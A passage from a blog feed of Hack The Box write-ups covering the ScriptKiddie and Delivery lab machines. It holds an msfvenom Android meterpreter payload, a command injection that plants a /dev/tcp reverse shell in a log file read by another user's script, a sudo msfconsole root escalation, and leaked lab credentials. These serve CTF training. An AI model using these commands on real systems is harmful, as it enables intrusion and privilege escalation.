Do: msfvenom &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /tmp/tmpt7qr4ner/evil.apk &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; android/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127.0.0.1 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After obtaining the evil payload, started one listener and selected the options suggested in the payload output, where selecting the android operating system would result in the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;android/meterpreter/reverse_tcp&lt;/code&gt; we aim to abuse based in the existing vulnerability, as well as specifying the lhost as 127.0.0.1 but this shouldn’t impact the way exploit will work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hWgxfFw.png&quot; alt=&quot;Submiting the evil payload&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After hitting the &lt;strong&gt;Generate&lt;/strong&gt; button, a reverse shell was returned, as seen below in this screenshot.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/VAYnB2r.png&quot; alt=&quot;reverse shell returned&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inspecting the session obtained, with the credentials running the web application, in this case user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kid&lt;/code&gt;, was possible to obtain the user flag, as the file resided in it’s home directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kid@scriptkiddie:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
kid@scriptkiddie:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/kid/user.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;After running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linenum.sh&lt;/code&gt; to automate the enumeration, noticed taht there was another user called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt;, possibly with more privileges than the user we currently have. As we had access to it’s home directory, found a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanloosers.sh&lt;/code&gt; with the following content:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/kid/logs/hackers

&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/pwn/
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f3-&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;ip&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nmap --top-ports 10 -oN recon/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.nmap &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null&quot;&lt;/span&gt; &amp;amp;
&lt;span class=&quot;k&quot;&gt;done

if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt; &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-gt&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As this script reads the content of a file in the current’s user home directory (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/kid/logs/hackers&lt;/code&gt;) and issues an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; command, edited the content of this file in a way we would inject a reverse shell command with the user running this script, possibly &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;  ;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/4242 0&amp;gt;&amp;amp;1' #&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ~/logs/hackers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After setting up a new listener and changing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hackers&lt;/code&gt; file with the above-mentioned content, another session was obtained, this time with the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt; :smile:&lt;/p&gt;

&lt;p&gt;Enumerating the box again, this time with the new user account, noticed by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; that this user has access to start &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; in a privileged way.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once started it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, I was able to issue commands as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, as well as read the content of file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; and obtain the final flag for this machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwn@scriptkiddie:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/metasploit-framework-6.0.9/msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
msf6 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;id

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
msf6 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt

&amp;lt;redacted&amp;gt;
msf6 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hope this was somehow useful!&lt;/p&gt;

&lt;p&gt;See you in the next post :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Hello guys! This week’s machine will be ScriptKiddie, another easy-rated Linux box from Hack The Box, created by 0xdf.</summary></entry><entry><title type="html">Hackthebox write-up: Delivery</title><link href="https://davicruz.com/writeup/2021/05/htb-delivery/" rel="alternate" type="text/html" title="Hackthebox write-up: Delivery" /><published>2021-05-22T13:00:00-03:00</published><updated>2021-05-22T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/05/htb-delivery</id><content type="html" xml:base="https://davicruz.com/writeup/2021/05/htb-delivery/">&lt;p&gt;Hello guys!&lt;/p&gt;

&lt;p&gt;This week’s machine will be &lt;strong&gt;Delivery&lt;/strong&gt;, another easy-rated machine from &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/3769&quot;&gt;ippsec&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups for Hack The Box machines are posted as soon as they’re retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/7C0GCed.png&quot; alt=&quot;HTB Delivery&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This box’s resolution was pretty interesting, where I had the opportunity to learn on how to crack passwords using a dictionary variation using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;, besides the several pivoting, until get to the user credentials, and then, getting root.&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As usual, started with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; quick scan to identify published services in this box.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.222
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-20 17:01 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.222
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;32.54 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---http-service&quot;&gt;80/TCP - HTTP Service&lt;/h3&gt;

&lt;p&gt;Acessing the page and inspecting the source-code, identified that there’s a link to &lt;strong&gt;helpdesk.delivery.htb&lt;/strong&gt;. Added this dns entry to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;, as well as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delivery.htb&lt;/code&gt;, to make easier access and enumeration to this page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/DFYYSkN.png&quot; alt=&quot;HTB Delivery - Website&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After clicking to &lt;em&gt;Contact us&lt;/em&gt; link, the following information was shown, informing that as soon as we get a delivery.htb e-mail we could access the &lt;strong&gt;MatterMost&lt;/strong&gt; server, which works at TCP 8065, according to enumeration.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;h2 id=&quot;contact-us&quot;&gt;CONTACT US&lt;/h2&gt;
  &lt;p&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you’ll be able to have access to our MatterMost server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;While looking for a way to get e-mail address with HelpDesk, raised a support ticket with dummy content while inspecting the requests using &lt;em&gt;BurpSuite&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;After submitting the request, received the information below, something crucial to obtain access to Mattermost: a &lt;strong&gt;@delivery.htb&lt;/strong&gt; e-mail address!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Zh6GeDh.png&quot; alt=&quot;HTB Delivery - Helpdesk Website&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Accessing the Mattermost platform, created an account using the osTicket provided e-mail. This way, in case we need to receive any kind of confirmation in a delivery.htb account, data will supposedly be sent to the incident history we have just created :smile:.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6zMqj4N.png&quot; alt=&quot;HTB Delivery - Mattermost&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As expected, once reviewing the request history, we can see the account activation details from Mattermost, sent to &lt;strong&gt;8024065@delivery.htb&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TLIBKIn.png&quot; alt=&quot;HTB Delivery - Email comment&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After verified the account, we were able to access the portal with the created credentials and had access to a public team called &lt;strong&gt;Internal&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/qN2YraR.png&quot; alt=&quot;HTB Delivery - Mattermost - Account Confirmed&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Among the messages available on this channel, some called attention, but some information was gathered that might be useful for machine resolution:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;osTicket Admin Credentials were &lt;strong&gt;maildeliverer:Youve_G0t_Mail!&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Devs were using &lt;em&gt;variants of &lt;strong&gt;PleaseSubscribe!&lt;/strong&gt;&lt;/em&gt; as passwords everywhere and should stop using it.
    &lt;ul&gt;
      &lt;li&gt;These variants could be easily cracked using &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; rules&lt;/strong&gt;, which is a great tip on how to obtain the root password, or something in its path.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/8KP9NRl.png&quot; alt=&quot;HTB Delivery - Mattermost Internal Channel&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Searching in the osTicket administration page, made logoff of &lt;em&gt;Guest User&lt;/em&gt;, from the left upper-corner and, during the sign-in process, selected the option &lt;strong&gt;I’m an agent - sign in here&lt;/strong&gt;, which took me to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://helpdesk.delivery.htb/scp/login.php&lt;/code&gt;, where the incidents are managed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/JsI5fmb.png&quot; alt=&quot;HTB Delivery - OsTicket Admin Portal&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once logged in as &lt;strong&gt;maildeliverer&lt;/strong&gt;, was able to confirm the osTicket version, which is &lt;strong&gt;1.15.1&lt;/strong&gt;, where we’re going to look for some existing exploit o weakness which could get us an initial access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/vYiQjKN.png&quot; alt=&quot;HTB Delivery - OsTicket Version&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Browsing in the console, found an API, which mentions task execution through a scheduler using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cron&lt;/code&gt;. Inspecting its documentation available at &lt;a href=&quot;https://docs.osticket.com/en/latest/Developer%20Documentation/API/Tasks.html?highlight=cron&quot;&gt;this link&lt;/a&gt; it mentions the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts\rcron.php&lt;/code&gt; which is used to orchestrate the calls.&lt;/p&gt;

&lt;p&gt;Besides have created an API key for my IP Address and tried to use the script available at &lt;a href=&quot;https://raw.githubusercontent.com/osTicket/osTicket/1.15.x/setup/scripts/rcron.php&quot;&gt;this link&lt;/a&gt;, &lt;strong&gt;had no success on executing a payload through the application&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;initial-access-and-user-flag&quot;&gt;Initial Access and User Flag&lt;/h2&gt;

&lt;p&gt;Besides several attempts using osTicket API, gave some steps back and thinking simple, asked myself: Is &lt;strong&gt;maildeliverer&lt;/strong&gt; a user at this machine? On I tried to SSH using its account I was able to not only connect to this machine (:man_facepalming:) but also get the flag in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;, available at his root directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh maildeliverer@10.10.10.222                                                                                                 
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.222 (10.10.10.222)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '&lt;/span&gt;10.10.10.222&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
maildeliverer@10.10.10.222'&lt;/span&gt;s password:
Linux Delivery 4.19.0-13-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.10.10
maildeliverer@Delivery:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 28
drwxr-xr-x 3 maildeliverer maildeliverer 4096 Jan  3 23:12 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root          root          4096 Dec 26 09:01 ..
lrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 maildeliverer maildeliverer 3526 Dec 26 09:01 .bashrc
drwx------ 3 maildeliverer maildeliverer 4096 Dec 28 06:58 .gnupg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile
&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt; 1 maildeliverer maildeliverer   33 Feb 24 06:58 user.txt
maildeliverer@Delivery:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Started with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; execution to automate enumeration and the following findings called attention:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Process &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 /root/py-smtp.py&lt;/code&gt; running as &lt;strong&gt;root&lt;/strong&gt;. Could eventually allow path hijack if it’s calling some binaries without their full path.&lt;/li&gt;
  &lt;li&gt;Also, &lt;strong&gt;root&lt;/strong&gt; has a script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/mail.sh&lt;/code&gt;, that could be abused the same way as the previous execution.&lt;/li&gt;
  &lt;li&gt;MySQL instance running in its default port (TCP 3306).&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;osticket&quot;&gt;osTicket&lt;/h3&gt;

&lt;p&gt;As I couldn’t read any of the two promising files for path hijack, started looking for credentials to get access to MySQL and try to dump some credentials. In osTicket install folder, have found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/osticket/upload/include/ost-config.php&lt;/code&gt; which contained the creds for &lt;strong&gt;ost_user&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;define('ADMIN_EMAIL','maildeliverer@delivery.htb')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;define('DBTYPE','mysql')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBHOST','localhost')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBNAME','osticket')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBUSER','ost_user')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBPASS','!H3lpD3sk123!')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;define('TABLE_PREFIX','ost_')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Besides able to connect to MySQL, nothing useful was found, so decided to look for credentials in Mattermost installation.&lt;/p&gt;

&lt;h3 id=&quot;mattermost&quot;&gt;Mattermost&lt;/h3&gt;

